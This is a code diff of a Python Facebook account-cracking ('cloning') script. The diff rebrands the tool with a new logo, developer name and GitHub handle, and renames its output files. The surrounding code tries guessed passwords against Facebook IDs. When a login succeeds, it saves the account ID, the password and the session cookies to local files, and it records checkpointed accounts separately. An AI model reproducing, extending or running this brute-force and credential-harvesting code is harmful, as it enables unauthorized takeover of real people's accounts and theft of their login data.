@@ -212,16 +212,17 @@ def clear():
 #===================[LOGO]===========================
 os.system('xdg-open ')
 logo=(f"""
-{green}M   M RRRR      EEEE RRRR  RRRR   OOO  RRRR  
-{green}MM MM R   R     E    R   R R   R O   O R   R 
-{green}M M M RRRR      EEE  RRRR  RRRR  O   O RRRR  
-{green}M   M R R       E    R R   R R   O   O R R   
-{green}M   M R  RR     EEEE R  RR R  RR  OOO  R  RR
+  _      ______ _____ ______ _   _ _____  
+ | |    |  ____/ ____|  ____| \ | |  __ \ 
+ | |    | |__ | |  __| |__  |  \| | |  | |
+ | |    |  __|| | |_ |  __| | . ` | |  | |
+ | |____| |___| |__| | |____| |\  | |__| |
+ |______|______\_____|______|_| \_|_____/ 
 {white}================================================
-{red}[{white}√{red}]{green} DEVELOPER {white}▶ {green}︎MR ERROR
+{red}[{white}√{red}]{green} DEVELOPER {white}▶ {green}︎LEGEND-XD
 {red}[{white}√{red}]{green} TOOLTYPE {white} ▶︎{green} FREE {red}({green}FILE {white}& {green}RANDOM{red})
-{red}[{white}√{red}]{green} GITHUB    {white}▶︎ github.com/MR-ERROR-707
-{red}[{white}√{red}]{green} VERSION   {white}▶ {green}︎{version}
+{red}[{white}√{red}]{green} GITHUB    {white}▶︎ github.com/RIMON-511
+{red}[{white}√{red}]{green} VERSION   {white}▶ {green}︎{version} 0.1
 {white}================================================
 """)
 
@@ -232,10 +233,10 @@ def ___ERROR___():
     print(f'{red}[{white}B{red}]{green} RANDOM CLONING')
     print(f'{red}[{white}C{red}]{green} JOIN FACEBOOK GROUP')
     line()
-    __ERROR__ = input(f'{red}[{white}◆{red}]{green} Selection {white}:{yellow} ')
-    if __ERROR__ in['A','a','01','1']:___FILE___()
-    elif __ERROR__ in ['B','b','02','2']:___RANDOM___()
-    elif __ERROR__ in ['C','c','03','3']:os.system('xdg-open ');___ERROR___()
+    __RIMON__ = input(f'{red}[{white}◆{red}]{green} Selection {white}:{yellow} ')
+    if __RIMON__ in['A','a','01','1']:___FILE___()
+    elif __RIMON__ in ['B','b','02','2']:___RANDOM___()
+    elif __RIMON__ in ['C','c','03','3']:os.system('xdg-open ');___ERROR___()
     else:
         print(f'{red}[{white}×{red}]{green} WRONG OPTION')
         time.sleep(2)
@@ -347,7 +348,7 @@ def ___BD___():
     print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
     input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
-    ___ERROR___()
+    ___RIMON___()
         
 #====================[INDIA RANDOM]==========================
 def ___INDIA___():
@@ -399,7 +400,7 @@ def ___INDIA___():
     print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
     print(f'\r{white}================================================')
     input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
-    ___ERROR___()
+    ___RIMON___()
 #====================[MALAYSIA RANDOM]==========================
 def ___ML___():
     clear()
@@ -721,13 +722,13 @@ try:
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
-                    open('/sdcard/ERROR-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
-                    open('/sdcard/ERROR-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RIMON-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RIMON-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                      #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
-                     open('/sdcard/ERROR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/RIMON-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                 else:
                     continue
@@ -793,13 +794,13 @@ try:
                 if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r{red}[{white}√{red}] {red}[{green}ERROR-OK{red}] {green}{sid} {white}| {green}{ps} ")
-                    open('/sdcard/ERROR-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
-                    open('/sdcard/ERROR-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RIMON-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RIMON-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\r{red}[ERROR-CP] {sid} | {ps} ")
-                     open('/sdcard/ERROR-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/RIMON-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                      cps.append(sid)
                      break
                 else:continue
